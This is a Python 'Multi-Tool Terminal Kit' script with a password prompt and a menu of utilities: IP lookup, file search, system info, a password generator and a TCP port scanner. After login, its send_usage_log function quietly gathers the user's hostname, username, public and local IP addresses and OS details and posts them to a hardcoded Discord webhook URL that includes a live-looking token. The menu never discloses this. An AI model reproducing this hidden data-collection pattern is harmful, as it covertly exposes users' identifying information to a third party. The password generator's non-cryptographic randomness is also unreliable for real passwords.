import os
import platform
import socket
import shutil
import random
import string
from datetime import datetime
import psutil
import time
import requests
import getpass

# ========== CONFIG ==========
TOOL_PASSWORD = "Adminstrator"
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1386367557836996709/pehZdI98g6NLt3JOzZRDiPHDjCjTL2jXojkKiPuS8lLEzbK5u5K_bF3TC4Z5ryq__5Wu"  # <== Replace this with your webhook URL
# ============================

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def print_logo():
    print(r"""
 __  __       _ _   _       _   _           _ 
|  \/  |     (_) | (_)     | | | |         | |
| \  / | __ _ _| |_ _  __ _| |_| |__   __ _| |
| |\/| |/ _` | | __| |/ _` | __| '_ \ / _` | |
| |  | | (_| | | |_| | (_| | |_| | | | (_| | |
|_|  |_|\__,_|_|\__|_|\__,_|\__|_| |_|\__,_|_|

       Multi-Tool Terminal Kit
   (do not resell this tool dont say it is you there made it!)
""")

def send_usage_log():
    try:
        public_ip = requests.get("https://api.ipify.org").text
    except Exception:
        public_ip = "Unavailable"

    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "Unavailable"

    os_info = f"{platform.system()} {platform.release()} ({platform.version()})"
    hostname = socket.gethostname()
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    username = getpass.getuser()

    message = (
        f"# 📨Tool Usage Log\n"
        f"> 👁‍🗨Hostname: {hostname}"
        f"> 💬Username: {username}\n"
        f"> 🌐Public IP: {public_ip}\n"
        f"> 💻Local IP: {local_ip}\n"
        f"> 💾OS: {os_info}\n"
        f"> ⌚Time: {current_time}\n"
        
    )

    data = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Usage logged successfully.")
        else:
            print(f"Failed to log usage (status code {response.status_code})")
    except Exception as e:
        print(f"Error sending webhook: {e}")

def password_prompt():
    clear()
    print_logo()
    for _ in range(3):
        entered = input("🔐 Enter tool password: ")
        if entered == TOOL_PASSWORD:
            return True
        else:
            print("❌ Incorrect password.\n")
    return False

def ip_lookup():
    import requests
    ip = input("Enter IP or domain: ")
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        data = response.json()
        print("\nIP Information:")
        for key, value in data.items():
            print(f"{key.capitalize()}: {value}")
    except Exception as e:
        print("Error:", e)
    input("\nPress Enter to return to menu...")

def file_search():
    filename = input("Enter filename to search for: ")
    start_dir = input("Enter directory to search in (default is / or C:\\): ") or "/"
    print("\nSearching... This may take a while.")
    for root, dirs, files in os.walk(start_dir):
        if filename in files:
            print("Found:", os.path.join(root, filename))
    input("\nPress Enter to return to menu...")

def system_info():
    print("\nSystem Information:")
    print("OS:", platform.system())
    print("Release:", platform.release())
    print("Version:", platform.version())
    print("Machine:", platform.machine())
    print("Processor:", platform.processor())
    print("Hostname:", socket.gethostname())
    input("\nPress Enter to return to menu...")

def disk_usage():
    print("\nDisk Usage:")
    total, used, free = shutil.disk_usage("/")
    print("Total:", total // (2**30), "GB")
    print("Used:", used // (2**30), "GB")
    print("Free:", free // (2**30), "GB")
    input("\nPress Enter to return to menu...")

def password_generator():
    length = input("Enter password length (default 12): ")
    length = int(length) if length.isdigit() else 12
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    print(f"\nGenerated Password: {password}")
    input("\nPress Enter to return to menu...")

def process_viewer():
    print("\nRunning Processes:")
    for proc in psutil.process_iter(['pid', 'name']):
        print(f"PID: {proc.info['pid']}, Name: {proc.info['name']}")
    input("\nPress Enter to return to menu...")

def system_uptime():
    uptime = time.time() - psutil.boot_time()
    hours, remainder = divmod(uptime, 3600)
    minutes, seconds = divmod(remainder, 60)
    print(f"System Uptime: {int(hours)}h {int(minutes)}m {int(seconds)}s")
    input("\nPress Enter to return to menu...")

def port_scanner():
    target = input("Enter IP to scan: ")
    port_range = input("Enter port range (e.g. 20-80): ")
    try:
        start_port, end_port = map(int, port_range.split("-"))
        print(f"Scanning {target}...")
        for port in range(start_port, end_port + 1):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    print(f"Port {port}: OPEN")
    except Exception as e:
        print("Error:", e)
    input("\nPress Enter to return to menu...")

def main():
    if not password_prompt():
        print("Access denied.")
        return

    send_usage_log()

    while True:
        clear()
        print_logo()
        print("===============================")
        print("1. IP Lookup")
        print("2. File Search")
        print("3. System Info")
        print("4. Disk Usage")
        print("5. Password Generator")
        print("6. Process Viewer")
        print("7. System Uptime")
        print("8. Port Scanner")
        print("9. Exit")
        choice = input("\nChoose an option [1-9]: ")

        if choice == "1":
            ip_lookup()
        elif choice == "2":
            file_search()
        elif choice == "3":
            system_info()
        elif choice == "4":
            disk_usage()
        elif choice == "5":
            password_generator()
        elif choice == "6":
            process_viewer()
        elif choice == "7":
            system_uptime()
        elif choice == "8":
            port_scanner()
        elif choice == "9":
            print("Goodbye!")
            break
        else:
            input("Invalid choice! Press Enter to try again.")

if __name__ == "__main__":
    main()
